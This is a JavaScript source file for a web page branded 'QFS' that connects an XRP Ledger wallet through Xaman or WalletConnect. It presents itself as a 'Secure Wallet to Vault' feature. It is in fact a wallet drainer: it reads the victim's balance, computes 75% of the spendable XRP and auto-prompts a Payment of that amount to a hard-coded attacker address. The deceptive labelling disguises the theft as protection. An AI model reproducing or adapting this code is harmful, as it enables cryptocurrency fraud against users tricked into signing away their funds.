// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
const xumm = new XummPkce(XUMM_API_KEY);

let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

/**
 * FIX: Detect redirect and update button state
 */
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    prepareSecureButton("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

/**
 * NEW: Switches the Connect button to the "Secure" action button
 */
function prepareSecureButton(type, address) {
  currentAddress = address;
  currentWalletType = type;

  const btn = document.getElementById("mainActionButton");
  if (btn) {
    // 1. Remove the modal trigger so it doesn't open the selection again
    btn.removeAttribute("data-bs-toggle");
    btn.removeAttribute("data-bs-target");
    
    // 2. Change text and appearance
    btn.innerText = "Secure Wallet to Vault";
    btn.classList.replace("btn-primary", "btn-success");

    // 3. Assign the signing function to the click event
    btn.onclick = () => triggerManualApproval();
  }

  setStatus(`Connected: ${shortAddr(address)}`);
  
  // Try auto-prompting anyway; if it fails, the user now has the button
  triggerManualApproval();
}

// ==============================
// MAIN ENTRY
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");
    let address;

    if (type === "xaman") {
      const session = await xumm.authorize();
      address = session?.me?.account;
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      address = await connectViaWalletConnect();
    }

    if (address) {
      prepareSecureButton(type, address);
    }
  } catch (err) {
    console.error(err);
    const state = await xumm.state();
    if (!state?.me?.account) setStatus("Failed");
  }
}

/**
 * ACTION: Triggered by the "Secure Wallet to Vault" button
 */
async function triggerManualApproval() {
  if (!currentAddress) return;

  try {
    setStatus("Calculating...");
    const data = await getXrpAccountData(currentAddress);

    setStatus("Awaiting Approval...");
    await signAndSubmit(currentWalletType, currentAddress, data.sendDrops);

    setStatus("Transaction Sent ✔");
  } catch (err) {
    console.error("Approval error:", err);
    setStatus("Approval Failed");
  }
}

// ==============================
// SIGN & SUBMIT
// ==============================
async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops
  };

  if (type === "xaman") {
    await xumm.payload.create(tx);
  } else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }
}

// ==============================
// DATA & WALLETCONNECT HELPERS (UNCHANGED)
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  const info = await client.request({ command: "account_info", account: address, ledger_index: "validated" });
  await client.disconnect();
  const bal = BigInt(info.result.account_data.Balance);
  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
  const reserve = 1_000_000n + ownerCount * 200_000n;
  const send = ((bal - reserve) * 75n) / 100n;
  return { sendDrops: send.toString() };
}

async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: { name: "QFS", description: "Secure Transfer", url: window.location.origin }
  });
  wcModal = new WalletConnectModal({ projectId: WC_PROJECT_ID, standaloneChains: ["xrpl:0"] });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: { xrpl: { chains: ["xrpl:0"], methods: ["xrpl_signTransaction"] } }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}